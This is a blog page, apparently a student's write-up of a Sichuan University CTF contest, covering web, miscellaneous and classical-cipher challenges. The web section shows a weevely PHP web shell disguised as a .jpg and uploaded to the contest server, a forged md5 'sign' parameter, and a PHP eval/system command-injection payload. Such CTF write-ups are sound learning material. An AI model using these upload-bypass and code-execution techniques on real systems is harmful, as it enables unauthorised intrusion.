@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  
+    <link rel="alternate" hreflang="zh" href="/zh/2022/07/21/easiestctf/">
+  
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/">Home</a>
+				<a href="/archives">Archive</a>
+				
+					<a href="/categories">Categories</a>
+				
+				
+					<a href="/tags">Tags</a>
+				
+				<a href="/zh">中文站</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+      <nav class="lang-switch" role="navigation" aria-label="Language switch">
+        
+          <a class="lang-pill"
+             href="/zh/2022/07/21/easiestctf/"
+             hreflang="zh">
+            <span class="lang-label">中文</span>
+          </a>
+        
+      </nav>
+    
+
+	<h1>Sichuan University CTF shixun cup wp</h1>
+	<p>It's just the same material covered in class, even simpler than what I studied a year ago for the school entrance exam.</p>
+<span id="more"></span>
+<h2 id="WEB">WEB</h2>
+<h3 id="Easy-Flag">Easy_Flag</h3>
+<p>Press ctrl+u to view the source code:</p>
+<pre><code class="language-html">&lt;meta http-equiv=&quot;&quot; content=&quot;&quot;  charset=&quot;utf-8&quot;/&gt;
+Nothing here～
+&lt;!--flag.php--&gt;
+&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;
+    
+    document.oncontextmenu = function() &#123;
+        event.returnValue = false;
+        alert('Want to see the code?');
+    &#125;;
+   
+    document.onkeydown = document.onkeyup = document.onkeypress = function(event) &#123;
+        let e = event || window.event || arguments.callee.caller.arguments[0];
+        if (e &amp;&amp; e.keyCode == 123) &#123;
+            e.returnValue = false;
+            alert('Didn't expect that, did you? This won't work either.');
+            return false;
+        &#125;
+    &#125;;
+&lt;/script&gt;
+</code></pre>
+<p>Follow the hint and check /flag.php.</p>
+<h3 id="Easy-Button">Easy_Button</h3>
+<p>Change <code>maxlength</code> to 50 in f12, then post any phone number in hackbar.</p>
+<p>For example: <code>phone=12312312312</code></p>
+<h3 id="Easy-Browser">Easy_Browser</h3>
+<p>View the source code:</p>
+<pre><code class="language-html">    &lt;html&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+    &lt;body&gt;
+        The page has nothing
+        &lt;!--Check what's in the cookie--&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+</code></pre>
+<p>Follow the hint and check the cookie.</p>
+<img src='https://img.junyu33.me/blog/easiestctf/1.png'>
+<p>Access /get.php and submit a parameter named &quot;flag&quot; with a value of 1.</p>
+<p><code>/get.php?flag=1</code></p>
+<h3 id="Spinning-Carousel">Spinning Carousel</h3>
+<p>Blind guess: upload.php, found an image upload button provided.</p>
+<p>I'm on Linux and can't install AntSword, so I'm using weevely here.</p>
+<pre><code class="language-shell">weevely generate 1234 ./114514.php
+mv 114514.php 114514.jpg
+</code></pre>
+<p>When submitting, use Burp Suite to intercept the packet and change the extension back to .php.</p>
+<pre><code class="language-shell">weevely http://47.116.24.9:81/upload/114514.php 1234
+</code></pre>
+<p>After entering the shell:</p>
+<pre><code class="language-shell">ls
+cat flag_859421239.txt
+</code></pre>
+<h3 id="Lucky-Draw-Game">Lucky Draw Game</h3>
+<p>After the lucky draw, capture the packet:</p>
+<pre><code class="language-http">GET /ctf4/check.php?tar=12&amp;sign= HTTP/1.1
+Host: 47.116.24.9
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Referer: http://47.116.24.9/ctf4/game.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: sign=md5(tar)
+Connection: close
+</code></pre>
+<p>Blind guess: <code>tar=flag</code>, then <code>sign=md5('flag')=327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
+<p>Submit after modifying the <code>GET</code> parameters accordingly.</p>
+<h3 id="Rceeeee">Rceeeee</h3>
+<p>Filter Evasion:</p>
+<p><code>?data=eval($_GET[1]);&amp;1=system('ls');</code></p>
+<p>The rest is up to you.</p>
+<h2 id="Miscellaneous">Miscellaneous</h2>
+<h3 id="Calabash-Brothers">Calabash Brothers</h3>
+<p>After extraction, modify the height of the PNG image.</p>
+<img src='https://img.junyu33.me/blog/easiestctf/2.png'>
+<h3 id="File-Error">File_Error</h3>
+<p>This is a ZIP file with pseudo-encryption.</p>
+<img src='https://img.junyu33.me/blog/easiestctf/3.png'>
+<h3 id="shark">shark</h3>
+<p>The problem says the flag can be found just by searching, so let's search directly.</p>
+<pre><code class="language-shell">cat webone.pcap | grep -a flag
+</code></pre>
+<h2 id="Crypto">Crypto</h2>
+<h3 id="Check-in-Question">Check-in Question</h3>
+<p>urldecode</p>
+<p><a target="_blank" rel="noopener" href="https://www.urldecoder.io/">https://www.urldecoder.io/</a></p>
+<h3 id="Fence-Cipher">Fence Cipher</h3>
+<p>Fence cipher</p>
+<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
+<p>Number of characters per group: 9</p>
+<h3 id="Romeo-and-Juliet">Romeo and Juliet</h3>
+<p>A combination of Braille cipher, Pigpen cipher, and Templar cipher. Decrypt them one by one.</p>
+
+</div>
+
+
+  </div>
+</body>
+</html>
+
